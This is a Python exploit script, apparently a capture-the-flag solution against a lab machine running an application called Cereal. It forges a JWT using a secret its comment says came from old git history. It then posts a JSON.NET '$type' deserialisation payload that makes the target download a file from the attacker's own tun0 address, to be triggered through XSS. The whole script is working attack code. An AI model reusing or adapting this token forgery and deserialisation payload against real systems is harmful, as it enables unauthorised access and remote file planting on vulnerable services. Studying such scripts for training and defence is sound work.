import requests
import netifaces as ni
import jwt
import json
from datetime import datetime, timedelta

def get_ip(interface):
    """find your IP on a given interface"""
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print(ip)
    
    return ip

def generate_token():
    """generates a JWT token"""
    
    # take key from old git code - commit ID 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
    key = "secretlhfIH&FY*#oysuflkhskjfhefesf"

    # encode with HMAC-SHA-256
    token = jwt.encode({"exp": datetime.utcnow() + timedelta(days=7), "name": 1}, key, algorithm="HS256")
    print("Generated token: " + token)
    
    return token
    
def target_cereal(ip, base_url, base_headers):
    """POST a cereal request to create the target cereal
    this will be deserialised by an XSS request and trigger a download"""
    
    download_url = "https://{}/test.txt".format(ip)
    print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))

    target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"

    targetResp = requests.post(base_url, data=target_json_string, headers=base_headers, verify=False)
    print("Response Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))

    target_id = str(json.loads(targetResp.text)["id"])
    print("Target cereal ID: " + target_id)
    
    return target_id
    
def main():
    # get tun0 IP address
    ip = get_ip("tun0")
    
    # set URL
    base_url = "https://10.10.10.217/requests"
    
    # generate a token
    token = generate_token()

    # set headers
    base_headers = {"Content-Type": "application/json", "Authorization": "Bearer {}".format(token), "Cache-Control": "max-age=0"}
    
    # generate a target cereal and get its ID
    target_id = target_cereal(ip, base_url, base_headers)
    
main()
